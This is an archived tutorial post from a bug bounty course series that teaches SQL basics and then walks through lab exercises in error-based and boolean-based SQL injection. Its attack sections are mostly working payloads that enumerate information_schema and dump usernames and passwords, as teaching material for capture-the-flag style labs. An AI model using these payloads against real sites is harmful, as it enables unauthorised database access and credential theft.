# SQL Injection

- **Source URL:** https://medium.com/@julius.grosserode.19/sql-injection-97a239647ac7?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250804072938/https://medium.com/@julius.grosserode.19/sql-injection-97a239647ac7
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9009 (id 9009)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# SQL Injection

*This is part of my NahamSec bug bounty course series. Summary + Solutions for all Sections.*

SQL (Structured Query Language) is a programming Language used to communicate with a database. Normally users dont interact with SQL directly but the backend handeles Quereies based of the users actions.

An SQL Injection is a vulnerability where an attacker can manipulate queries executed by the backend to retrieve or modify data they should not have access to.

If you want to master SQL injections you fist need to learn the language. The best way to learn it is by doing. So here are some challenges.

First have a look at the example database:

you have 3 entries, each with an id, firstname, lastname and email.

Here are simple queries to get you started:

1. Select all the columns from the table named customers.
2. Select the id and firstname columns from the table named customers.
3. Select the id and firstname columns from the table named customers where the id is equal to 1
4. Select the id and firstname columns from the table named customers where the firstname column starts with b
5. Select the id and firstname columns from the table named customers where the firstname column starts with b and the id is greater than 2
6. Select all the columns from the table named customers in ascending order by the column id
7. Select all the columns from the table named customers in descening order by the column id.
8. Select all the columns from the table named customers but limit the results to just the first row.
9. Select all the columns from the table named customers but limit the results to just the second row.
10. Select the email columns from the customers and suppliers table.

**Here are the solutions.**

```
SELECT * from customers
SELECT ID, firstname from customers
SELECT ID, firstname from customers WHERE ID=1
SELECT ID, firstname from customers WHERE firstname LIKE 'b%'
SELECT ID, firstname from customers WHERE firstname LIKE 'b%' and  ID > 2
SELECT * from customers ORDER BY ID ASC
SELECT * from customers ORDER BY ID DESC
SELECT * from customers LIMIT 1
SELECT * from customers limit 1,1
SELECT email from customers UNION SELECT email from suppliers
```
Lets discuss the syntax quickly.

`SELECT (columns) FROM (database).(table) where (if clause) ORDER BY (column) (ASC or DESC) LIMIT (skip, amount) UNION (other statement));-- comment`
We only used the Select statement here, there is also `UPDATE` and `DELETE` and some more. Lets go through all options one by one:

1. you can select wich columns (id, firstname, email or all (\*)) you want.
2. next in one database exsist multiple tables we only selected data from the customers table except in the last one where we also queried the suplliers table. (You can also specify diffrent db’s).
3. You can specify wich entries in that table from that column you want. Are you searching for the entrie where the first name starts with b?
4. ORDER the results by one of the columns (Ascending or Descending.)
5. LIMIT the output or skip a certain number of entries.
6. UNION is used to combine diffrent statements.
7. `;--` is often used as an inline comment.

You can learn more abouto SQL at [w3school](https://www.w3schools.com/sql/).

**Solution:** To get the first flag use `select * from flag` .

Lets see how we can identify a sql injection. Here the Error Based SQLi Lab is really helpfull. Its an articel page like this:

[https://boup8nvj.eu2.ctfio.com/article?id=1](https://boup8nvj.eu2.ctfio.com/article?id=1)

If you try to read the articel with the id=2 you dont get it. That because the SQL querie used to get the articel looks like this

`select * from articles where released=1 and id=2`
The attacker can only control the id parameter, however released is set to 1 so no other articel will be returned.

To check if this query ist injectable set the ID to this: `/article?id=1'and 1=1;--` . This is a techinqe we already used in my [XSS article](/@julius.grosserode.19/xss-nahamsec-aebbeefbf3a9) called escaping. We set the id to 1 and then add more to the SQL query.

Next check this: `/article?id=1'and 1=2;--` . Since 1 is not equals 2 this time the first articel wont be returned. (But also no error). This means the page is definitly vurnable to SQL injection.

`select * from articles where released=1 and id='1' and 1=2;--`
Finally we can querie the backend for the unreleased articel using the or keyword: `0' or id='2` . The sql after the *or* keyword dosent depend on the *where* clause anymore and therefore the whole querie retuns the articel.

`SELECT * FROM articles where released=1 and id='0' or id='2'`
We could also use a `UNION` statement to achive the same in a similar way: `'UNION select * from articles;--` . The comment at the end removes the ‘

`select * from articles where released=1 and id='1' UNION select * from articles;--'`
You can also use UNION to find out how many columns the db (database) has. Enter these *IDs* one after another in the url:

1. `0' UNION select 1;--` ->error
2. `0' UNION select 1, 2;--` -> error
3. `0' UNION select 1,2, 3;--` -> error
4. `0' UNION select 1,2,3,4;--` ->works (4 columns)
5. `0' UNION select 1,2,3,'hello';--` -> string are also returnable
6. `0' UNION select 1,2,3,database();--` -> returns name of current db

`select * from articles where released=1 and id='0' UNION select 1, 2, 3, 4;--'`
This means that the table has 4 columns. For all other amount of columns the error: `The used SELECT statements have different number of columns` is returned.

The application your testing often has accses to more than one db. One of these db is a special db called information\_schema. It contains meta information about all current db’s.

For example it holds the names of all dbs:

`SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;`
To fit our case we need to fit the number of columns again:

`SELECT 1,2,3,SCHEMA_NAME FROM information_schema.SCHEMATA;`
The full querie in the backend now looks like this:

`select * from articles where released=1 and id='0' UNION SELECT 1,2,3,SCHEMA_NAME FROM information_schema.SCHEMATA;--'`
This query returns this table:

But since we are still in the context of an articel reader, in practice we could only see one entry at the time. To display all rows in one row, so to say, we can use `GROUP_CONCAT` wich puts all results from one colume (in our case we are intrested in the content column and therefore the SCHEMA\_NAME column) into one row. Here is the deal:

`0' UNION SELECT 1,2,3,GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA;--`
The result is only one row:

Next lets look what tables the **sqli\_two** db has:

`0' UNION SELECT 1,2,3,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA ='sqli_two';--`
This returns all table names in the sqli\_two db: `articles,flag,users` . Lets further focus on the users table (but also have a look at the flag table!). We can find the COLUMN\_NAMEs inside information\_schema.COLUMNS and we filter for the db sqli\_two and the table users. We also use GROUP CONCAT again.

`0' UNION SELECT 1,2,3,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA ='sqli_two' and TABLE_NAME='users';--`
As a results we can see that the users table has `id,username,password` as column names.

If you made it this far you have pretty solid understanding of where is what and especially what is what called. Lets use that to finish thing up by leaking all usernames and passwords.

`0' UNION select 1,2, username, password from users;--`
This is only one users and his password. We might use `GROUP_CONCAT` again:

`0' UNION select 1,2, GROUP_CONCAT(username), GROUP_CONCAT(password) from users;--`
or you can also use `CONCAT()` for nicer output:

`0' UNION SELECT 1,2,3,GROUP_CONCAT( CONCAT(username,password) ) from users;--`
And just like that an entire database full of top secret credentials is in your hands.

**Solution**

for the flag qury the flag table:

`0' UNION SELECT 1,2,3,flag from flag;`
## Boolean Based SQLi

As we dont always see what happens to our sql injection payloads in the real world. On method of finding out about the db uses booleans (true or false values). Lets first look at our example context.

We have an api that checks if a username is availabel:

https://ctfio.com/api/checkuser?username=ben


true or false is returned in json format.

`{"taken":true}`
Behind the scenes there is a sql query of course:

`select * from users where username='ben'`
first lets check if the enpoint is vurnable by setting the username to `ben' and 1=1;--` and `ben' and 1=2;--`. In our case the api is of course vurnable.

For the next step really take your time. Its not that easy:

`adam' and 1=(SELECT 1 FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--`
- `SELECT 1 FROM ...`: If a matching database exists returns 1
- `information_schema.SCHEMATA` stores db names
- `WHERE SCHEMA_NAME like 'i%'` filters database names that start with "i"

Now if there is a database starting with i this whole thing would return true, if not than not.

Using this we can work our way up by trying every letter one by one until we get a full name. In this try we could find out that there is indeed a database named `sqli_three` . Lets find out wich tables are inside there

`adam' and 1=(SELECT 1 FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME like 'u%' LIMIT 1 );--`
1. whole subquery returns 1 if a results exsists.
2. we look inside the `information_schema` db for the `TABLES` table. This one stores information about all tables.
3. We filter for tables inside the `sqli_three` db.
4. We also filter for table names that start with a *u.*
5. We only display one result.
6. We comment the rest of the query out that might get added

The response is `true` so there is a table starting with u. If you check further you would eventually find out that it is called `users` .

Lets find out the column names in the users table in the sqli\_three db.

`adam' and 1=(select 1 from information_schema.COLUMNS where COLUMN_NAME LIKE 'a%' and TABLE_SCHEMA ='sqli_three' and TABLE_NAME ='users');--`
1. Again the whole thing return true if an entry exsists
2. The entry we are searching for is a column name. All column names are stored in `information_schmea.COLUMNS` .
3. The column should be inside the `sqli_three` db inside the `users` table.
4. The column should start with `a` for now.

Enumirating all column names will get you (no suprise): `id,username and password`

Now we know there is a table called users inside sqli\_three wich has the columns username and password. Using this we can bruteforce passwords from usernames. Lets say we already found that ben is taken. we could use thie query to find his password:

`adam' and 1=(select 1 from users where username='ben' and password like 'd%');--`
Now that would take us a lot of time. You can write a [python script](/@julius.grosserode.19/brute-forcing-blind-sqli-with-python-fb7bd29767cb) to automate this task in a few lines. I wrote an accompanying [sub articel](/@julius.grosserode.19/brute-forcing-blind-sqli-with-python-fb7bd29767cb) showing how to do that. It found both passwords in about 5 seconds!

You also need the tool to find the flag if you dont want to test every letter (upper and lower).

Because the SQL section is quite large the rest will soon be published in PART 2.
